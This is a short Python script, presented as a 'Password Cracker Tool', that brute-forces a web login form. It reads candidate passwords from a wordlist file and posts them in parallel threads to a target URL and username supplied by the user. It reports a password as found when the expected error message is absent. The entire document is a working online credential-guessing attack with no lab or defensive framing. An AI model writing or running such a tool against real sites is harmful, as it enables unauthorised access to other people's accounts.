import threading
import requests
import time

class PasswordCracker:
    def __init__(self, url, username, error_msg):
        self.url = url
        self.username = username
        self.error_msg = error_msg
        
        print("Initializing Password Cracker...")
        print("Target URL:", self.url)
        print("Target Username:", self.username)

    def crack_password(self, password):
        data = {"username": self.username, "password": password, "submit": "submit"}
        response = requests.post(self.url, data=data)
        if self.error_msg in str(response.content):
            print(f"Incorrect password: {password}")
        elif "CSRF" in str(response.content):
            print("CSRF Token detected. Exiting...")
            return True
        else:
            print("Password found:", password)
            return True

def brute_force_passwords(passwords, password_cracker):
    for password in passwords:
        password = password.strip()
        print("Trying password:", password)
        if password_cracker.crack_password(password):
            return

def main():
    print("Welcome to the Password Cracker Tool!")
    target_url = input("Enter the target URL: ")
    target_username = input("Enter the target username: ")
    error_msg = input("Enter the incorrect password error message: ")

    password_cracker = PasswordCracker(target_url, target_username, error_msg)

    with open("passwords.txt", "r") as f:
        chunk_size = 1000
        while True:
            passwords = f.readlines(chunk_size)
            if not passwords:
                break
            t = threading.Thread(target=brute_force_passwords, args=(passwords, password_cracker))
            t.start()

if __name__ == '__main__':
    main()
